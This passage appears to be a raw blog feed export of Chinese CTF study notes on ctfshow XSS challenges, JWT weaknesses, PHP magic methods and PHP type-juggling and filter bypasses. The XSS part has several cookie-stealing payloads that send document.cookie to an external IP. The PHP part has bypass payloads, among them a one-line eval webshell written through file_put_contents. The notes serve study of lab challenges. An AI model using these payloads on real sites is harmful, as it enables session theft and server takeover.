&lt;iframe&gt;标签是用于在网页中嵌入其他网页或文档的元素，onload事件是在&lt;iframe&gt;加载完成后触发的事件。</span><br><span class="line">&lt;body onload=&quot;windows.open(&#x27;https://www.baidu.com&#x27;)&quot;&gt; // 加载百度页面</span><br><span class="line"></span><br><span class="line">&lt;body onload=&#x27;console.log(1)&#x27;&gt; // 控制台打印1</span><br><span class="line">&lt;body onload=&#x27;console.info(1)&#x27;&gt;</span><br><span class="line">&lt;body onload=&#x27;console.error(1)&#x27;&gt;</span><br><span class="line">onfocus=javascript:alert()</span><br><span class="line">绕过方法</span><br><span class="line">过滤空格，用/、Tab(%09)或者/**/代替空格，如&lt;body/onload=alert(1)&gt;</span><br><span class="line">过滤alert，用top[&#x27;aler&#x27;+&#x27;t&#x27;]绕过</span><br><span class="line">过滤 alert()，用top[&#x27;aler&#x27;+&#x27;t&#x27;].call 绕过</span><br></pre></td></tr></table></figure></div><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>没有一点过滤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://47.115.221.235:1234/myjs/niuniu.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>这是蓝莲花Blue-Lotus自带的脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var website=&quot;http://47.115.221.235:1234/index.php&quot;;</span><br><span class="line">(function()&#123;(new Image()).src=website+&#x27;/?keepsession=1&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure></div><p>不会的喵</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>过滤了script<br>我们考虑img标签</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><p>又过滤了img<br>我们考虑body</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>过滤了空格</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>spring学习</title>
    <link href="http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-16T15:51:00.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="研究中"><a href="#研究中" class="headerlink" title="研究中"></a>研究中</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="spring" scheme="http://example.com/tags/spring/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="framework" scheme="http://example.com/tags/framework/"/>
    
  </entry>
  
  <entry>
    <title>jwt</title>
    <link href="http://example.com/2025/03/10/web/jwt/jwt/"/>
    <id>http://example.com/2025/03/10/web/jwt/jwt/</id>
    <published>2025-03-10T20:20:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><p>JWT即Json Web Token的缩写，顾名思义，是Token的一种。它常被用来在向服务器发起请求时用作身份认证。使用JWT作为身份认证的优势在于：它不需要在服务端去保留用户的认证信息。仅需要对该Token正确性进行校验即可,这就意味着基于token认证机制的应用,不需要去考虑用户在哪一台服务器登录了，为应用的扩展提供了便利。</p><p>新技术带来便利的同时也会带来新的安全问题，如果JWT本身安全存在问题，那么整个身份认证机制就会得不到保障。</p><p>JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内容，第三部分是加密的签名部分</p><h3 id="弱签名算法（无算法）"><a href="#弱签名算法（无算法）" class="headerlink" title="弱签名算法（无算法）"></a>弱签名算法（无算法）</h3><p>更改头部中声明的加密算法</p><h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>如果JWT使用HS系列(对称加密)的加密方法，而且使用较为简单的Key进行加密，那么使用工具就极有可能能够得到key,之后就可以随意的篡改JWT了。<br>jwt_tool&lt;-是个好东西。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="jwt" scheme="http://example.com/categories/jwt/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</id>
    <published>2025-03-08T20:13:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php反序列化" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php特性</title>
    <link href="http://example.com/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/"/>
    <id>http://example.com/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/</id>
    <published>2025-03-04T18:51:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、数组绕过正则表达式"><a href="#1、数组绕过正则表达式" class="headerlink" title="1、数组绕过正则表达式"></a>1、数组绕过正则表达式</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">else(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句</p><p>payload:num[]&#x3D;1</p><h1 id="2、intval函数的使用"><a href="#2、intval函数的使用" class="headerlink" title="2、intval函数的使用"></a>2、intval函数的使用</h1><p>intval( mixed $value, int $base &#x3D; 10) : int<br>如果 base 是 0，通过检测 value 的格式来决定使用的进制：<br>◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>◦ 将使用 10 进制 (decimal)。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>科学计数法也可以绕过</p><p>intval(‘4476.0’)&#x3D;&#x3D;&#x3D;4476    小数点<br>intval(‘+4476.0’)&#x3D;&#x3D;&#x3D;4476   正负号<br>intval(‘4476e0’)&#x3D;&#x3D;&#x3D;4476    科学计数法<br>intval(‘0x117c’)&#x3D;&#x3D;&#x3D;4476    16进制<br>intval(‘010574’)&#x3D;&#x3D;&#x3D;4476    8进制<br>intval(‘ 010574’)&#x3D;&#x3D;&#x3D;4476   8进制+空格<br>payload:num&#x3D;4476.0</p><p>这里补充一下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(42);                      // 42</span><br><span class="line">echo intval(4.2);                     // 4</span><br><span class="line">echo intval(&#x27;42&#x27;);                    // 42</span><br><span class="line">echo intval(&#x27;+42&#x27;);                   // 42</span><br><span class="line">echo intval(&#x27;-42&#x27;);                   // -42</span><br><span class="line">echo intval(042);                     // 34</span><br><span class="line">echo intval(&#x27;042&#x27;);                   // 42</span><br><span class="line">echo intval(1e10);                    // 10000000000</span><br><span class="line">echo intval(&#x27;1e10&#x27;);                  // 10000000000</span><br><span class="line">echo intval(0x1A);                    // 26</span><br><span class="line">echo intval(42000000);                // 42000000</span><br><span class="line">echo intval(420000000000000000000);   // 0</span><br><span class="line">echo intval(&#x27;420000000000000000000&#x27;); // 2147483647</span><br><span class="line">echo intval(42, 8);                   // 42</span><br><span class="line">echo intval(&#x27;42&#x27;, 8);                 // 34</span><br><span class="line">echo intval(array());                 // 0</span><br><span class="line">echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h1 id="3、正则表达式修饰符"><a href="#3、正则表达式修饰符" class="headerlink" title="3、正则表达式修饰符"></a>3、正则表达式修饰符</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>i 不区分(ignore)大小写；m多(more)行匹配，若有换行符则以换行符分割，按行匹配</p><p>payload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过</p><h1 id="4、highlight-file路径"><a href="#4、highlight-file路径" class="headerlink" title="4、highlight_file路径"></a>4、highlight_file路径</h1><p>highlight_file的参数可以是路径的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php              绝对路径<br>.&#x2F;flag.php                          相对路径<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php      php伪协议</p><h1 id="5、md5比较缺陷"><a href="#5、md5比较缺陷" class="headerlink" title="5、md5比较缺陷"></a>5、md5比较缺陷</h1><p>PHP中hash比较是存在缺陷的，MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;</span><br><span class="line">    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">    print &#x27;Wrong.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>不同数据强相等</p><p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p><p>md5弱比较，使用了强制类型转换后不再接收数组</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</p><p>不同数据弱相等</p><p>payload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p><p>MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017</p><p>md5强碰撞</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这时候需要找到两个真正的md5值相同数据</p><p>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><h1 id="6、三目运算符的理解-变量覆盖"><a href="#6、三目运算符的理解-变量覆盖" class="headerlink" title="6、三目运算符的理解+变量覆盖"></a>6、三目运算符的理解+变量覆盖</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br></pre></td></tr></table></figure></div><p>太经典了，我晕了</p><p>第一行，GET被设置，就可以用POST覆盖GET的值。中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它</p><p>payload:get：1&#x3D;1 post：HTTP_FLAG&#x3D;flag</p><h1 id="7、php弱类型比较"><a href="#7、php弱类型比较" class="headerlink" title="7、php弱类型比较"></a>7、php弱类型比较</h1><p>经典</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>弱比较字符串1.php与1返回true。array_push这个函数往里填数字1，则是int类型，in_array使用的就是&#x3D;&#x3D;弱比较。所以，如果数组里有数字1，与字符串1.php比较时是返回true的。注意，$array( 1 , ‘2’ , ‘3’ )，这里1是int型，2和3都是string类型。</p><p>这道题，每次生成随机数都包含1，所以1在数组中的可能最大。</p><p>payload:n&#x3D;1.php post:content&#x3D;<?php eval($_POST[1]);?>多试几次，然后蚁剑直接连</p><h1 id="8、and与-amp-amp-的区别"><a href="#8、and与-amp-amp-的区别" class="headerlink" title="8、and与&amp;&amp;的区别"></a>8、and与&amp;&amp;的区别</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=true and false and false;</span><br><span class="line">var_dump($a);  返回true</span><br><span class="line"></span><br><span class="line">$a=true &amp;&amp; false &amp;&amp; false;</span><br><span class="line">var_dump($a);  返回false</span><br></pre></td></tr></table></figure></div><h1 id="9、反射类ReflectionClass"><a href="#9、反射类ReflectionClass" class="headerlink" title="9、反射类ReflectionClass"></a>9、反射类ReflectionClass</h1><p>反射类还不太懂，但做过题都是直接输出这个类echo new ReflectionClass(‘类名’);</p><h1 id="10、is-numeric与hex2bin"><a href="#10、is-numeric与hex2bin" class="headerlink" title="10、is_numeric与hex2bin"></a>10、is_numeric与hex2bin</h1><p>​ is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x</p><h1 id="11、sha1比较缺陷"><a href="#11、sha1比较缺陷" class="headerlink" title="11、sha1比较缺陷"></a>11、sha1比较缺陷</h1><p>sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($a==$b)&#123;</span><br><span class="line">    if(sha1($a)==sha1($b))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如</p><p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p><h1 id="12、PHP双-（-）的变量覆盖"><a href="#12、PHP双-（-）的变量覆盖" class="headerlink" title="12、PHP双$（$$）的变量覆盖"></a>12、PHP双$（$$）的变量覆盖</h1><p>在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$test=&quot;a23&quot;;    $test等于a23</span><br><span class="line">$$test=456;        $$test也就等于$23,这里相当于给$a23赋值了</span><br><span class="line">echo $test;        正常输出$test为a23</span><br><span class="line">echo $$test;    这里输出$$test，就是$a23，为456</span><br><span class="line">echo $a23;        第二行给$a23赋值了，这里正常输出</span><br></pre></td></tr></table></figure></div><h1 id="13、parse-str函数的使用"><a href="#13、parse-str函数的使用" class="headerlink" title="13、parse_str函数的使用"></a>13、parse_str函数的使用</h1><p>parse_str会把字符串解析为变量，大部分是传入的多个值</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&quot;q=123&amp;p=456&quot;;</span><br><span class="line">parse_str($a);</span><br><span class="line">echo $q;                输出123</span><br><span class="line">echo $p;                输出456</span><br><span class="line">parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中</span><br><span class="line">echo $b[&#x27;q&#x27;];            输出123</span><br><span class="line">echo $b[&#x27;p&#x27;];            输出456</span><br></pre></td></tr></table></figure></div><p>php8版本必须要有第二个参数，php7不影响使用但会警告一下</p><h1 id="14、ereg-00正则截断"><a href="#14、ereg-00正则截断" class="headerlink" title="14、ereg %00正则截断"></a>14、ereg %00正则截断</h1><p>ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。</p><h1 id="15、迭代器获取当前目录"><a href="#15、迭代器获取当前目录" class="headerlink" title="15、迭代器获取当前目录"></a>15、迭代器获取当前目录</h1><p>FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，getcwd()这个函数可以获取当前文件路径，二者在一定条件下配合使用较好</p><h1 id="16、-GLOBALS全局变量的使用"><a href="#16、-GLOBALS全局变量的使用" class="headerlink" title="16、$GLOBALS全局变量的使用"></a>16、$GLOBALS全局变量的使用</h1><p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义</p><h1 id="17、php伪协议绕过is-file-highlight-file对于php伪协议的使用"><a href="#17、php伪协议绕过is-file-highlight-file对于php伪协议的使用" class="headerlink" title="17、php伪协议绕过is_file highlight_file对于php伪协议的使用"></a>17、php伪协议绕过is_file highlight_file对于php伪协议的使用</h1><p>is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式</p><h1 id="18、多写根目录绕过is-file"><a href="#18、多写根目录绕过is-file" class="headerlink" title="18、多写根目录绕过is_file"></a>18、多写根目录绕过is_file</h1><p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容<br>多次重复后绕过is_file的具体原理尚不清楚。如上面的代码，也可以用下面payload代替</p><p>file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>这个按理说也是文件的，但is_file认为不是</p><h1 id="19、trim函数的绕过-is-numeric绕过"><a href="#19、trim函数的绕过-is-numeric绕过" class="headerlink" title="19、trim函数的绕过+is_numeric绕过"></a>19、trim函数的绕过+is_numeric绕过</h1><p>这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字，跟trim一起测试一下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ($i=0; $i &lt;=128 ; $i++) &#123; </span><br><span class="line">    $x=chr($i).&#x27;1&#x27;;</span><br><span class="line">   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">        echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>payload:num&#x3D;%0c36</p><h1 id="20、绕过死亡die"><a href="#20、绕过死亡die" class="headerlink" title="20、绕过死亡die"></a>20、绕过死亡die</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure></div><p>这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE 